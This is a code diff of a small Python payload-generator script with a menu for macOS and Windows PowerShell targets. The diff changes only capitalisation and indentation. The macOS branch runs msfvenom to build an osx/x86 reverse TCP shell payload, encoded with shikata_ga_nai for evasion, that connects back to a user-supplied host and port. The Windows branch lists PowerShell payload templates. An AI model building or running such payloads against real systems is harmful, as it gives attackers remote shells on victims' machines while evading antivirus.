@@ -2,7 +2,7 @@ import os, random
 
 def menu():
     banner()
-    print("─╼┤architecture├───────────────────────────────────\n")
+    print("─╼┤ARCHITECTURE├───────────────────────────────────\n")
     print("\t\t(1) macho (osx)")
     print("\t\t(2) powershell (win)\n")
     mode = input("─╼┤SELECTION├─> ")
@@ -10,14 +10,14 @@ def menu():
 
 def payloadGenerator(mode):        
     if mode == "1":
-	print("\n")
-	host = input("─╼┤HOST├─> ")
-	port = input("─╼┤PORT├─> ")
-	command = "sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST="+host+" LPORT="+port+" -a x86 --platform osx -e x86/shikata_ga_nai -o shadowpayload.macho"
-	os.system(command)
+	    print("\n")
+	    host = input("─╼┤HOST├─> ")
+	    port = input("─╼┤PORT├─> ")
+	    command = "sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST="+host+" LPORT="+port+" -a x86 --platform osx -e x86/shikata_ga_nai -o shadowpayload.macho"
+	    os.system(command)
         
     elif mode == "2":
-        print("─╼┤templates├──────────────────────────────────────\n")
+        print("─╼┤TEMPLATES├──────────────────────────────────────\n")
         os.system("ls templates")
         template = input("\n─╼┤SELECTION├─> ")
         print("\n")
